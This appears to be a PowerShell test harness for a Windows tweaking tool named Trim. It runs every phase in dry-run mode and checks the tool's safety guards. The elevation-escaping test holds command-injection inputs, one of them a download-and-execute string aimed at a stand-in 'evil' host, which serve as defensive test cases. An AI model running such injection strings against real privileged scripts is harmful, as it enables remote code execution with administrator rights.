#Requires -Version 5.1
<#
.SYNOPSIS
    Exercises every phase's dry-run path without the elevation gate.

.DESCRIPTION
    The compiled script self-elevates, which means running it to test it triggers
    a UAC prompt and a second window. This harness dot-sources the source modules
    directly instead, skipping 01-header (the param block and elevation) and
    99-main (which calls Invoke-Main immediately).

    Everything it runs is read-only: -DryRun makes Set-Reg/Remove-Reg print
    rather than write, and every phase that shells out checks $DryRun first.

    This is a smoke test, not a correctness test. It proves the code runs, the
    detection works, and the phases produce the changes they claim. It cannot
    prove the registry values are the right ones - that needs a VM.
#>
[CmdletBinding()]
param()

$ErrorActionPreference = 'Stop'
Set-StrictMode -Version 2.0

$root = Split-Path $PSScriptRoot -Parent

# Stand in for the compiled script's param block.
$DryRun           = $true
$Skip             = @()
$Only             = @()
$NoRestorePoint   = $true
$Aggressive       = $false
$WinUtilConfigUrl = Join-Path $root 'config\winutil-tweaks.json'
$NvidiaProfile    = ''
$DisableMemoryIntegrity = $false
$NoRestartPrompt  = $true
$Cleanup = $false; $IncludeDuplicates = $false; $CleanupSelection = ''
$Gui = $false; $ApplySelection = ''

foreach ($f in (Get-ChildItem (Join-Path $root 'src') -Filter '*.ps1' | Sort-Object Name)) {
    if ($f.Name -eq '01-header.ps1' -or $f.Name -eq '99-main.ps1') { continue }
    . $f.FullName
}

# 01-header cannot be dot-sourced whole - its param block must come first and
# its top level relaunches the process elevated. But the argument-escaping used
# to build that elevated command line lives in it, and leaving the single most
# security-critical function in the codebase untestable is not acceptable.
# So its function DEFINITIONS are lifted out by parsing, and nothing else runs.
$headerAst = [System.Management.Automation.Language.Parser]::ParseFile(
    (Join-Path (Join-Path $root 'src') '01-header.ps1'), [ref]$null, [ref]$null)
foreach ($fn in $headerAst.FindAll({ $args[0] -is [System.Management.Automation.Language.FunctionDefinitionAst] }, $false)) {
    . ([scriptblock]::Create($fn.Extent.Text))
}

# The NVIDIA phase reads its template from this variable; build.ps1 embeds it.
# The NVIDIA profile is composed per card in 11-gpu.ps1; there is no asset.

$failures = [System.Collections.Generic.List[string]]::new()

function Test-Phase {
    param([string]$Name, [scriptblock]$Body)
    try {
        & $Body
        Write-Host "PASS  $Name" -ForegroundColor Green
    } catch {
        Write-Host "FAIL  $Name" -ForegroundColor Red
        Write-Host "      $($_.Exception.Message)" -ForegroundColor Red
        Write-Host "      $($_.ScriptStackTrace -split "`n" | Select-Object -First 2)" -ForegroundColor DarkRed
        $failures.Add("$Name : $($_.Exception.Message)") | Out-Null
    }
}

Write-Host ''
Write-Host 'Trim - dry run harness' -ForegroundColor Cyan
Write-Host ''

$facts = $null
Test-Phase 'Get-MachineFacts'     { $script:facts = Get-MachineFacts }
Test-Phase 'Show-MachineFacts'    { Show-MachineFacts -Facts $script:facts }
Test-Phase 'Read-WinUtilConfig'   {
    $sel = Read-WinUtilConfig -Source $WinUtilConfigUrl
    if (@($sel).Count -lt 15) { throw "expected 15+ selections, got $(@($sel).Count)" }
    $bad = @($sel | Where-Object { $_ -notmatch '^WPF(Install|Tweaks|Toggle|Feature|Appx)' })
    if ($bad.Count) { throw "config has keys winutil will reject: $($bad -join ', ')" }
}
Test-Phase 'Invoke-WinUtilPhase'  { Invoke-WinUtilPhase -ConfigUrl $WinUtilConfigUrl }
Test-Phase 'Invoke-FixesPhase'    { Invoke-FixesPhase }
Test-Phase 'Invoke-GamingPhase'   { Invoke-GamingPhase -Facts $script:facts }
Test-Phase 'Invoke-PrivacyPhase'  { Invoke-PrivacyPhase }
Test-Phase 'Invoke-AppxPhase'     { Invoke-AppxPhase }
Test-Phase 'Invoke-NetworkPhase'  { Invoke-NetworkPhase -Facts $script:facts }
Test-Phase 'Invoke-GpuPhase'   { Invoke-GpuPhase -Facts $script:facts -ProfileOverride '' }
Test-Phase 'Invoke-PerformancePhase' { Invoke-PerformancePhase -Facts $script:facts }
Test-Phase 'Invoke-BackgroundPhase'  { Invoke-BackgroundPhase }
Test-Phase 'Invoke-ExtrasPhase'   { Invoke-ExtrasPhase -Facts $script:facts }
Test-Phase 'Invoke-SecurityPhase' { Invoke-SecurityPhase -Facts $script:facts }
Test-Phase 'Security phase is opt-in only' {
    # The guarantee: a default run must never disable Memory Integrity.
    $before = Get-MemoryIntegrityState
    $n = $script:Ledger.Count
    Invoke-SecurityPhase -Facts $script:facts
    if ($script:Ledger.Count -ne $n) { throw 'default Security phase recorded a change; it must be read-only' }
    if (-not $before) { throw 'could not read Memory Integrity state' }
}
Test-Phase 'Invoke-Personalisation' { Invoke-PersonalisationPhase }

# The undo generator is the safety net; prove it emits valid PowerShell from a
# synthetic ledger rather than trusting it only on the day something goes wrong.
Test-Phase 'Write-UndoScript (synthetic ledger)' {
    $saved = $DryRun
    Set-Variable -Name DryRun -Value $false -Scope 1
    $script:Ledger.Clear()
    $script:Ledger.Add([pscustomobject]@{
        Action='set'; Path='HKCU:\Software\TrimSelfTest'; Name='HadOne'
        NewValue=1; HadValue=$true; OldValue=7; OldType='DWord'; KeyExisted=$true }) | Out-Null
    $script:Ledger.Add([pscustomobject]@{
        Action='set'; Path='HKCU:\Software\TrimSelfTest'; Name='WasAbsent'
        NewValue=1; HadValue=$false; OldValue=$null; OldType='DWord'; KeyExisted=$true }) | Out-Null
    $script:Ledger.Add([pscustomobject]@{
        Action='set'; Path='HKCU:\Software\TrimSelfTest'; Name="Quote'd"
        NewValue='a'; HadValue=$true; OldValue="it's"; OldType='String'; KeyExisted=$true }) | Out-Null

    Write-UndoScript
    Set-Variable -Name DryRun -Value $saved -Scope 1

    if (-not (Test-Path $script:UndoPath)) { throw 'no undo script written' }
    $errs = $null
    [void][System.Management.Automation.Language.Parser]::ParseFile($script:UndoPath, [ref]$null, [ref]$errs)
    if ($errs -and $errs.Count) { throw "undo script does not parse: $($errs[0].Message)" }

    $text = Get-Content -Raw $script:UndoPath
    if ($text -notmatch 'Remove-ItemProperty.*WasAbsent') { throw 'absent value should be removed on undo, not restored' }
    if ($text -notmatch "it''s")                          { throw 'single quotes not escaped in undo script' }
    # Newest-first: the quoted entry was added last, so it must unwind first.
    if ($text.IndexOf("Quote''d") -gt $text.IndexOf('HadOne')) { throw 'undo is not in reverse order' }
}

# Guard the AppX protection list: a prefix in the removal list must never be able
# to sweep up something load-bearing.
Test-Phase 'AppX protection guard' {
    foreach ($p in @('Microsoft.DesktopAppInstaller','Microsoft.WindowsStore',
                     'Microsoft.XboxIdentityProvider','Microsoft.ScreenSketch',
                     'Microsoft.VCLibs.140.00','Microsoft.SecHealthUI')) {
        if (-not (Test-AppxProtected $p)) { throw "'$p' is NOT protected but must be" }
    }
    foreach ($r in ($script:AppxRemoveStandard + $script:AppxRemoveAggressive + $script:AppxRemoveOem)) {
        if (Test-AppxProtected $r) { throw "removal list entry '$r' collides with the protected list" }
    }
}

# The window's whole promise is that what you saw is what gets applied. That
# rests entirely on the selection filter, so it gets its own test rather than
# being trusted because it looks right.
Test-Phase 'Selection filter gates every change' {
    $script:Ledger.Clear(); $script:Actions.Clear(); $script:AlreadySet.Clear()

    # 1. A filter matching nothing must produce no planned changes at all.
    $script:SelectionFilter = @{ 'reg|HKCU:\Software\NoSuchKey|Nope' = $true }
    Invoke-GamingPhase -Facts $script:facts
    Invoke-PrivacyPhase
    Invoke-PersonalisationPhase
    if ($script:Ledger.Count -ne 0) {
        $script:SelectionFilter = $null
        throw "filter matched nothing but $($script:Ledger.Count) change(s) were still planned"
    }

    # 2. A filter naming exactly one key must produce exactly that one.
    $script:SelectionFilter = $null
    $script:Ledger.Clear()
    Invoke-GamingPhase -Facts $script:facts
    if ($script:Ledger.Count -lt 2) { throw 'expected the unfiltered phase to plan more than one change' }
    $pick = $script:Ledger[0]
    $key  = "reg|$($pick.Path)|$($pick.Name)"

    $script:Ledger.Clear()
    $script:SelectionFilter = @{ $key = $true }
    Invoke-GamingPhase -Facts $script:facts
    $got = $script:Ledger.Count
    $script:SelectionFilter = $null
    if ($got -ne 1) { throw "filter named 1 key but $got change(s) were planned" }
}

# The GUI's item model is what the filter keys are built from, so a mismatch
# between the two would silently apply nothing.
Test-Phase 'GUI item keys match filter keys' {
    $script:Ledger.Clear(); $script:Actions.Clear()
    Invoke-GamingPhase -Facts $script:facts
    Invoke-AppxPhase
    $items = Get-GuiItems -Ledger $script:Ledger -Actions $script:Actions
    if (@($items).Count -eq 0) { throw 'no items built' }

    foreach ($i in $items) {
        if ($i.Key -notmatch '^(reg|act)\|') { throw "item key '$($i.Key)' has no recognised prefix" }
        if (-not $i.Phase) { throw "item '$($i.Title)' has no phase" }
        if ($i.Tier -notin @('safe','op','trade')) { throw "item '$($i.Title)' has tier '$($i.Tier)'" }
    }
    # Every registry item's key must round-trip through Test-SelectedChange.
    $regItem = @($items | Where-Object { $_.Kind -eq 'reg' })[0]
    $script:SelectionFilter = @{ $regItem.Key = $true }
    if (-not (Test-SelectedChange $regItem.Key)) { $script:SelectionFilter = $null; throw 'a GUI key did not match its own filter entry' }
    $script:SelectionFilter = $null

    # Trade-offs must never arrive pre-selected.
    $preTrade = @($items | Where-Object { $_.Tier -eq 'trade' -and $_.Selected }).Count
    if ($preTrade -gt 0) { throw "$preTrade trade-off item(s) were pre-selected" }
}

# The cleanup scan runs unelevated from the window, where several of the paths
# it probes are unreadable. Test-Path THROWS on those rather than returning
# false, so this asserts the scan stays quiet and returns usable rows.
Test-Phase 'Cleanup scan is read-only and never throws' {
    $before = $script:Ledger.Count
    $rows = @(Get-CleanupScan -Quiet)
    if ($script:Ledger.Count -ne $before) { throw 'the cleanup scan recorded a change; it must only measure' }

    foreach ($r in $rows) {
        if (-not $r.Path)                       { throw 'a cleanup row has no path' }
        if ($r.Bytes -lt 0)                     { throw "'$($r.Path)' reports negative bytes" }
        if ($r.Count -le 0)                     { throw "'$($r.Path)' was returned with no files" }
        if ($r.Tier -notin @('safe','op','trade')) { throw "'$($r.Path)' has tier '$($r.Tier)'" }
        if ($r.Key -notlike 'clean|*')          { throw "'$($r.Path)' has key '$($r.Key)'" }
        # Nothing outside a named location may ever be offered for deletion.
        if ($r.Path -match '^[A-Za-z]:\?$')    { throw "'$($r.Path)' is a drive root" }
    }

    # No folder twice. %TEMP% and %LOCALAPPDATA%\Temp are the same directory on
    # any machine that has not moved it, and both were listed - so the pane
    # showed one folder twice and every total counted its bytes twice. A tool
    # that overstates what it will free is lying about the only number anyone
    # reads on this screen.
    $byResolved = @{}
    foreach ($r in $rows) {
        $full = "$($r.Path)"
        try { $full = (Get-Item -LiteralPath $r.Path -Force -ErrorAction Stop).FullName } catch { }
        $k = $full.TrimEnd('\').ToLowerInvariant()
        if ($byResolved.ContainsKey($k)) {
            throw "'$($r.Path)' and '$($byResolved[$k])' are the same folder - its bytes are counted twice"
        }
        $byResolved[$k] = $r.Path
    }

    # And no location may be nested inside another one that is also offered,
    # for the same reason: the parent's byte count already includes the child.
    $paths = @($byResolved.Keys | Sort-Object)
    foreach ($child in $paths) {
        foreach ($parent in $paths) {
            if ($child -eq $parent) { continue }
            if ($child.StartsWith($parent + '\')) {
                throw "'$($byResolved[$child])' sits inside '$($byResolved[$parent])' - both are offered, so those bytes are counted twice"
            }
        }
    }

    # Anything that loses something a person might want must not be pre-ticked.
    $badDefault = @($rows | Where-Object { $_.Tier -ne 'safe' -and $_.Selected }).Count
    if ($badDefault) { throw "$badDefault non-safe cleanup location(s) are selected by default" }

    # Windows.old must never be anything but a trade-off.
    foreach ($r in ($rows | Where-Object { $_.Path -like '*Windows.old*' })) {
        if ($r.Tier -ne 'trade') { throw 'Windows.old is not marked as a trade-off' }
    }
}

# The three presets are only meaningful if there is real ground between them.
# Before the More options phase existed, Safe and Caution were the whole
# catalogue and Recommended ticked every single box.
Test-Phase 'Presets are genuinely different from each other' {
    $script:Ledger.Clear(); $script:Actions.Clear(); $script:AlreadySet.Clear()
    Invoke-PerformancePhase -Facts $script:facts
    Invoke-PrivacyPhase
    Invoke-NetworkPhase -Facts $script:facts
    Invoke-ExtrasPhase -Facts $script:facts
    $items = Get-GuiItems -Ledger $script:Ledger -Actions $script:Actions

    $safe  = @($items | Where-Object { $_.Tier -eq 'safe'  }).Count
    $caut  = @($items | Where-Object { $_.Tier -eq 'op'    }).Count
    $risky = @($items | Where-Object { $_.Tier -eq 'trade' }).Count

    if ($safe  -lt 3) { throw "only $safe safe item(s)" }
    if ($caut  -lt 15) { throw "only $caut caution item(s) - not enough ground between the presets" }
    if ($risky -lt 2) { throw "only $risky risky item(s) - Aggressive would be identical to Recommended" }

    # Recommended must be a strict subset of everything.
    $recommended = $safe + $caut
    if ($recommended -ge $items.Count) { throw 'Recommended would still select everything' }
}

# This program relaunches itself as administrator by composing a command line.
# Anything interpolated into that string crosses a privilege boundary, so an
# unescaped quote is not a formatting bug - it is arbitrary code running with
# full rights immediately after the user approves a UAC prompt they believe they
# are granting to Trim.
Test-Phase 'Elevation arguments cannot break out of their quoting' {
    $attacks = @(
        "x'; Start-Process calc; '",
        "x' ; iex (irm http://evil/) ; '",
        "'''",
        "a'b'c",
        "C:\path with 'quotes' in it.json"
    )
    foreach ($a in $attacks) {
        $escaped = ConvertTo-SafeArgument $a
        # Rebuild the exact construction the elevation path uses and confirm the
        # value survives as a single literal rather than becoming code.
        $rebuilt = Invoke-Expression "'$escaped'"
        if ($rebuilt -ne $a) { throw "escaping changed the value: '$a' became '$rebuilt'" }
    }

    # Control characters are refused outright rather than escaped.
    foreach ($bad in @("x`0y", "x`ny", "x`ry")) {
        $threw = $false
        try { ConvertTo-SafeArgument $bad } catch { $threw = $true }
        if (-not $threw) { throw 'a control character was accepted into an elevated argument' }
    }

    if ((ConvertTo-SafeArgument '') -ne '')       { throw 'empty string was not handled' }
    if ((ConvertTo-SafeArgument $null) -ne '')    { throw 'null was not handled' }
}

# Running as administrator means a bare tool name resolves through PATH, and a
# writable PATH entry then executes with those rights.
Test-Phase 'System tools resolve to real system paths' {
    foreach ($t in @('powercfg.exe','netsh.exe','reg.exe','sfc.exe','DISM.exe','shutdown.exe')) {
        $path = Get-SystemTool $t
        if (-not $path) { throw "'$t' did not resolve" }
        if (-not (Test-Path -LiteralPath $path)) { throw "'$t' resolved to a path that does not exist: $path" }
        if ($path -notmatch '(?i)\\Windows\\(System32|Sysnative)\\') {
            throw "'$t' resolved outside System32: $path"
        }
    }

    # And no source file may invoke one of them by bare name any more.
    $offenders = [System.Collections.Generic.List[string]]::new()
    foreach ($f in (Get-ChildItem (Join-Path $root 'src') -Filter '*.ps1')) {
        $lines = Get-Content -LiteralPath $f.FullName
        $inHelp = $false
        for ($i = 0; $i -lt $lines.Count; $i++) {
            $line = $lines[$i]
            # Comment-based help quotes the very pattern this guard looks for,
            # in the course of explaining why it is gone.
            if ($line -match '<#') { $inHelp = $true }
            if ($inHelp) { if ($line -match '#>') { $inHelp = $false }; continue }
            if ($line -match '^\s*#') { continue }
            if ($line -match '&\s+(powercfg|netsh|sfc|shutdown|winget|reg)\b' -and
                $line -notmatch 'Get-SystemTool') {
                $offenders.Add("$($f.Name) line $($i + 1)") | Out-Null
            }
            if ($line -match "-FilePath\s+'(DISM|sfc|reg|netsh|powercfg|shutdown)" ) {
                $offenders.Add("$($f.Name) line $($i + 1)") | Out-Null
            }
        }
    }
    if ($offenders.Count) { throw "bare tool invocation at: $($offenders -join '; ')" }
}

# The one binary this program downloads is then run as administrator.
Test-Phase 'The downloaded tool is pinned by version and hash' {
    if (-not $script:NpiSha256)                  { throw 'no pinned hash' }
    if ($script:NpiSha256.Length -ne 64)         { throw "pinned hash is $($script:NpiSha256.Length) characters" }
    if ($script:NpiSha256 -notmatch '^[0-9A-F]{64}$') { throw 'pinned hash is not hexadecimal' }
    if (-not $script:NpiBytes -or $script:NpiBytes -le 0) { throw 'no pinned size' }
    if ($script:NpiUrl -notmatch '^https://github\.com/Orbmu2k/nvidiaProfileInspector/releases/download/') {
        throw "the download URL is not a pinned GitHub release: $($script:NpiUrl)"
    }
    if ($script:NpiUrl -notmatch [regex]::Escape($script:NpiVersion)) {
        throw 'the URL does not carry the pinned version'
    }
}

# Every remote fetch has to be TLS, and modern TLS at that.
Test-Phase 'All remote fetches are https and modern TLS' {
    # Asserted against what ships, not against this test process: the header
    # sets it at top level, and the header's top level is deliberately not run
    # here. What matters is that the compiled script does it before it fetches.
    $compiled = Join-Path $root 'trim.ps1'
    if (-not (Test-Path $compiled)) { throw 'trim.ps1 has not been built' }
    $text = Get-Content -Raw -Encoding UTF8 -LiteralPath $compiled
    if ($text -notmatch 'SecurityProtocolType\]::Tls12') { throw 'the compiled script never enables TLS 1.2' }

    $tlsAt   = $text.IndexOf('SecurityProtocolType]::Tls12')
    $fetchAt = ($text.IndexOf('Invoke-WebRequest'), $text.IndexOf('Invoke-RestMethod') |
                Where-Object { $_ -gt 0 } | Measure-Object -Minimum).Minimum
    if ($fetchAt -gt 0 -and $tlsAt -gt $fetchAt) { throw 'TLS is enabled after the first fetch appears' }

    $bad = [System.Collections.Generic.List[string]]::new()
    foreach ($f in (Get-ChildItem (Join-Path $root 'src') -Filter '*.ps1')) {
        $lines = Get-Content -LiteralPath $f.FullName
        for ($i = 0; $i -lt $lines.Count; $i++) {
            if ($lines[$i] -match 'http://' -and $lines[$i] -notmatch '^\s*#|schemas\.microsoft\.com|www\.w3\.org') {
                $bad.Add("$($f.Name) line $($i + 1)") | Out-Null
            }
        }
    }
    if ($bad.Count) { throw "plain http reference at: $($bad -join '; ')" }
}

# A selection file is read by an elevated process and may have been written by a
# less privileged one. It can only ever gate changes the phases already planned,
# but malformed keys are still rejected rather than trusted.
Test-Phase 'Selection keys are validated, not trusted' {
    $valid   = @('reg|HKCU:\Software\Foo|Bar', 'act|command|Do the thing')
    $invalid = @('', 'nonsense', 'exec|calc.exe', "reg|x`0y", ('reg|' + ('a' * 600)))

    foreach ($k in $valid) {
        if ($k -notmatch '^(reg|act)\|[^\x00-\x1F]{1,512}$') { throw "a legitimate key was rejected: '$k'" }
    }
    foreach ($k in $invalid) {
        if ($k -match '^(reg|act)\|[^\x00-\x1F]{1,512}$') { throw "a malformed key was accepted: '$k'" }
    }

    # And the filter genuinely cannot introduce work: a key naming something no
    # phase would do must produce no changes at all.
    $script:Ledger.Clear()
    $script:SelectionFilter = @{ 'reg|HKCU:\Software\NotAThing|Nope' = $true }
    Invoke-PrivacyPhase
    $n = $script:Ledger.Count
    $script:SelectionFilter = $null
    if ($n -ne 0) { throw "a selection key that matches nothing still produced $n change(s)" }
}

# Deep uninstall is the only thing here that can destroy someone's work. Its
# guards are tested against the paths that would hurt most, and the default
# answer must always be no.
Test-Phase 'Uninstall guard refuses every dangerous path' {
    $pf   = $env:ProgramFiles
    $pf86 = ${env:ProgramFiles(x86)}
    $must_refuse = @(
        'C:\', 'C:\Windows', 'C:\Windows\System32', 'C:\Windows\SysWOW64',
        'C:\Users', $env:USERPROFILE, $env:ProgramData, $env:LOCALAPPDATA, $env:APPDATA,
        $pf, (Join-Path $pf 'WindowsApps'), (Join-Path $pf 'Common Files'),
        (Join-Path $pf 'Windows Defender'), (Join-Path $env:ProgramData 'Microsoft'),
        # Right shape, wrong owner: under a real root but not this application.
        (Join-Path $pf 'SomeOtherVendor'),
        # Outside every application root.
        'D:\Projects\win11-optimizer', 'E:\Steam',
        # Too short to be evidence of anything.
        (Join-Path $pf 'ab'),
        '', ' '
    )
    if ($pf86) { $must_refuse += @($pf86, (Join-Path $pf86 'Common Files')) }

    foreach ($path in $must_refuse) {
        if (Test-SafeToRemovePath -Path $path -AppName 'Foobar Studio' -Publisher 'Foobar Ltd') {
            throw "the guard ALLOWED '$path'"
        }
    }

    # And it has to actually permit the real case, or the feature does nothing.
    $must_allow = @(
        @{ P = (Join-Path $pf 'Foobar Studio');            A = 'Foobar Studio'; Pub = 'Foobar Ltd' }
        @{ P = (Join-Path $env:LOCALAPPDATA 'FoobarStudio'); A = 'Foobar Studio'; Pub = 'Foobar Ltd' }
        @{ P = (Join-Path $env:APPDATA 'Foobar Studio');   A = 'Foobar Studio'; Pub = 'Foobar Ltd' }
    )
    foreach ($c in $must_allow) {
        if (-not (Test-SafeToRemovePath -Path $c.P -AppName $c.A -Publisher $c.Pub)) {
            throw "the guard refused the legitimate path '$($c.P)'"
        }
    }
}

Test-Phase 'Uninstall guard refuses every dangerous registry key' {
    $must_refuse = @(
        'HKCU:\Software', 'HKLM:\SOFTWARE', 'HKLM:\SOFTWARE\WOW6432Node',
        'HKCU:\Software\Microsoft', 'HKLM:\SOFTWARE\Microsoft',
        'HKLM:\SOFTWARE\WOW6432Node\Microsoft', 'HKCU:\Software\Windows',
        'HKCU:\Software\SomeOtherVendor', 'HKCU:\Software\ab'
    )
    foreach ($k in $must_refuse) {
        if (Test-SafeToRemoveKey -Key $k -AppName 'Foobar Studio' -Publisher 'Foobar Ltd') {
            throw "the guard ALLOWED '$k'"
        }
    }
    if (-not (Test-SafeToRemoveKey -Key 'HKCU:\Software\Foobar Studio' -AppName 'Foobar Studio' -Publisher 'Foobar Ltd')) {
        throw 'the guard refused the legitimate product key'
    }
}

# Every protected publisher must be refused wholesale, not merely fail the name
# check by luck.
Test-Phase 'Uninstall never offers leftovers for a protected publisher' {
    foreach ($pub in @('Microsoft Corporation','NVIDIA Corporation','Intel Corporation','Realtek')) {
        $fake = [pscustomobject]@{
            Name = 'Some Component'; Publisher = $pub; Version = '1.0'
            InstallDir = (Join-Path $env:ProgramFiles 'Some Component')
            Uninstall = ''; QuietUninstall = ''; SizeMB = 0; RegistryKey = ''; Kind = 'win32'
        }
        $left = @(Get-AppLeftovers -App $fake)
        if ($left.Count -ne 0) { throw "publisher '$pub' produced $($left.Count) leftover candidate(s)" }
    }
}

Test-Phase 'Installed application list is usable' {
    $apps = @(Get-InstalledApplications)
    if ($apps.Count -lt 5) { throw "only $($apps.Count) applications found; the enumeration looks broken" }
    foreach ($a in $apps) {
        if (-not $a.Name) { throw 'an application has no name' }
        if ($a.Kind -notin @('win32','appx')) { throw "'$($a.Name)' has kind '$($a.Kind)'" }
    }
    # Update entries are not applications and must not be listed.
    $noise = @($apps | Where-Object { $_.Name -match '^(Update for|Security Update|KB\d{6,})' }).Count
    if ($noise) { throw "$noise Windows update entries leaked into the application list" }

    $problems = [System.Collections.Generic.List[string]]::new()

    # Every app carries both an identity and something a person can read. The
    # window reads the second; leftover matching and the protected-publisher
    # list read the first. A missing display field is a StrictMode error in
    # front of somebody mid-uninstall.
    foreach ($a in $apps) {
        foreach ($f in @('DisplayName','PublisherDisplay','IconSource')) {
            if ($a.PSObject.Properties.Name -notcontains $f) {
                $problems.Add("'$($a.Name)' has no $f") | Out-Null
                break
            }
        }
        if (-not "$($a.DisplayName)".Trim()) { $problems.Add("'$($a.Name)' would render with no name at all") | Out-Null }
    }

    # Nothing a person cannot identify. A row reading '1527c705-839a-4832-9118-
    # 54d4Bd6a0c89' beside a Remove button is how somebody deletes the Windows
    # file picker and loses every Open and Save dialog on the machine.
    $guid = @($apps | Where-Object { "$($_.DisplayName)" -match '^\{?[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-' })
    if ($guid.Count) {
        $problems.Add("$($guid.Count) app(s) would be shown as a bare GUID, starting with '$($guid[0].DisplayName)'") | Out-Null
    }
    # A certificate subject is not a publisher.
    $dn = @($apps | Where-Object { "$($_.PublisherDisplay)" -match '(^|,)\s*(CN|OU|SERIALNUMBER|OID\.)=' })
    if ($dn.Count) {
        $problems.Add("$($dn.Count) app(s) would show a raw certificate subject as the publisher") | Out-Null
    }

    # Inbox Windows components are not applications anybody installed, and the
    # uninstall pane must not offer them. The curated AppX phase is where Store
    # apps get removed, with the protection list applied.
    # Where Windows itself has a name for a package, that is the name to use.
    # Microsoft's inbox apps carry an unresolvable ms-resource: reference in
    # their manifest, so without this Media Player reads as 'ZuneMusic' and
    # Snipping Tool as 'ScreenSketch'.
    $start = Get-StartMenuNames
    if ($start.Count) {
        $byFamily = @{}
        try {
            foreach ($p in @(Get-AppxPackage -ErrorAction Stop | Where-Object { -not $_.IsFramework })) {
                $byFamily["$($p.Name)"] = "$($p.PackageFamilyName)"
            }
        } catch { }
        $wrong = @()
        foreach ($a in @($apps | Where-Object { $_.Kind -eq 'appx' })) {
            $fam = $byFamily["$($a.Name)"]
            if (-not $fam -or -not $start.ContainsKey($fam)) { continue }
            if ("$($a.DisplayName)" -ne $start[$fam]) { $wrong += "'$($a.DisplayName)' should read '$($start[$fam])'" }
        }
        if ($wrong.Count) {
            $problems.Add("$($wrong.Count) app(s) ignore the name Windows shows for them: $($wrong[0])") | Out-Null
        }
    }

    $appx = @($apps | Where-Object { $_.Kind -eq 'appx' })
    if ($appx.Count) {
        # Only meaningful where packages are enumerable at all. A swallowed
        # failure here would be a guard that passes because it did not run,
        # which is worse than no guard - so if the list has packages in it,
        # this has to be able to check them.
        $sys = $null
        try {
            $sys = @(Get-AppxPackage -ErrorAction Stop |
                     Where-Object { -not $_.IsFramework -and "$($_.SignatureKind)" -eq 'System' })
        } catch {
            $problems.Add("the list contains $($appx.Count) package(s) but they cannot be checked against the system set: $($_.Exception.Message)") | Out-Null
        }
        if ($null -ne $sys) {
            $offered = @{}
            foreach ($a in $appx) { $offered["$($a.Name)"] = $true }
            $leaked = @($sys | Where-Object { $offered.ContainsKey("$($_.Name)") })
            if ($leaked.Count) {
                $problems.Add("$($leaked.Count) Windows system package(s) are offered for removal, including '$($leaked[0].Name)'") | Out-Null
            }
        }
    }

    if ($problems.Count) { throw ($problems -join '; ') }
}

# A profile curated on one card and applied to another is at best useless and at
# worst a failed import that applies nothing. This is the table that decides
# which settings a given card gets, so it is tested against real product names
# rather than only against the card in this machine.
Test-Phase 'GPU capability matrix' {
    $cases = @(
        @{ Name = 'NVIDIA GeForce RTX 5070 Ti';  Gen = 'blackwell';    Dlss = $true;  Fg = $true;  Mfg = $true  }
        @{ Name = 'NVIDIA GeForce RTX 4090';     Gen = 'ada';          Dlss = $true;  Fg = $true;  Mfg = $false }
        @{ Name = 'NVIDIA GeForce RTX 3060 Ti';  Gen = 'ampere';       Dlss = $true;  Fg = $false; Mfg = $false }
        @{ Name = 'NVIDIA GeForce RTX 2070 SUPER'; Gen = 'turing';     Dlss = $true;  Fg = $false; Mfg = $false }
        @{ Name = 'NVIDIA GeForce GTX 1660 Ti';  Gen = 'turing-nort';  Dlss = $false; Fg = $false; Mfg = $false }
        @{ Name = 'NVIDIA GeForce GTX 1080 Ti';  Gen = 'pascal';       Dlss = $false; Fg = $false; Mfg = $false }
        @{ Name = 'NVIDIA GeForce GTX 970';      Gen = 'maxwell';      Dlss = $false; Fg = $false; Mfg = $false }
    )
    foreach ($c in $cases) {
        $cap = Get-NvidiaCapability -GpuNames @($c.Name)
        if (-not $cap)                        { throw "'$($c.Name)' was not recognised as NVIDIA" }
        if ($cap.Generation   -ne $c.Gen)     { throw "'$($c.Name)' -> '$($cap.Generation)', expected '$($c.Gen)'" }
        if ($cap.HasDlss      -ne $c.Dlss)    { throw "'$($c.Name)' DLSS=$($cap.HasDlss), expected $($c.Dlss)" }
        if ($cap.HasFrameGen  -ne $c.Fg)      { throw "'$($c.Name)' FrameGen=$($cap.HasFrameGen), expected $($c.Fg)" }
        if ($cap.HasMultiFrame -ne $c.Mfg)    { throw "'$($c.Name)' MultiFrame=$($cap.HasMultiFrame), expected $($c.Mfg)" }
    }

    # A non-NVIDIA name must return nothing rather than a bogus capability set.
    foreach ($n in @('AMD Radeon RX 7900 XTX','Intel(R) Arc(TM) A770 Graphics')) {
        if (Get-NvidiaCapability -GpuNames @($n)) { throw "'$n' was wrongly treated as NVIDIA" }
    }
}

# The composed profile must never contain a setting the card cannot do - that is
# the whole reason for composing it rather than shipping a file.
Test-Phase 'Composed NVIDIA profile matches the card' {
    $dlssIds  = @(283385345, 283385346, 283385350, 283385331, 283385335, 279951208, 280859683, 6505105)
    $fgIds    = @(283385347, 283385329)
    $mfgIds   = @(273507943)
    $desktop  = [pscustomobject]@{ IsLaptop = $false; RefreshRate = 144 }
    $laptop   = [pscustomobject]@{ IsLaptop = $true;  RefreshRate = 60  }

    $old = Get-NvidiaSettings -Cap (Get-NvidiaCapability -GpuNames @('NVIDIA GeForce GTX 1080 Ti')) -Facts $desktop -FrameLimit 141
    foreach ($id in ($dlssIds + $fgIds + $mfgIds)) {
        if (@($old | Where-Object { $_.Id -eq $id }).Count) { throw "a GTX 1080 Ti profile contains setting $id" }
    }
    if (-not @($old | Where-Object { $_.Id -eq 274197361 }).Count) { throw 'desktop profile is missing power management mode' }

    $ada = Get-NvidiaSettings -Cap (Get-NvidiaCapability -GpuNames @('NVIDIA GeForce RTX 4070')) -Facts $desktop -FrameLimit 141
    foreach ($id in $dlssIds + $fgIds) {
        if (-not @($ada | Where-Object { $_.Id -eq $id }).Count) { throw "an RTX 4070 profile is missing setting $id" }
    }
    foreach ($id in $mfgIds) {
        if (@($ada | Where-Object { $_.Id -eq $id }).Count) { throw "an RTX 4070 profile contains multi-frame setting $id" }
    }

    # Laptops must not get the clocks pinned high.
    $lap = Get-NvidiaSettings -Cap (Get-NvidiaCapability -GpuNames @('NVIDIA GeForce RTX 4060 Laptop GPU')) -Facts $laptop
    if (@($lap | Where-Object { $_.Id -eq 274197361 }).Count) { throw 'a laptop profile pins the power management mode' }

    # And the result has to be well-formed XML, or Profile Inspector rejects it.
    $xml = ConvertTo-NipXml -Settings $ada
    $doc = New-Object System.Xml.XmlDocument
    $doc.LoadXml(($xml -replace 'utf-16', 'utf-8'))
    $count = $doc.SelectNodes('//ProfileSetting').Count
    if ($count -ne $ada.Count) { throw "XML has $count settings, expected $($ada.Count)" }
}

# This script is developed on one machine and run on machines we never see, so
# the assumptions that machine happens to satisfy are exactly the ones that rot.
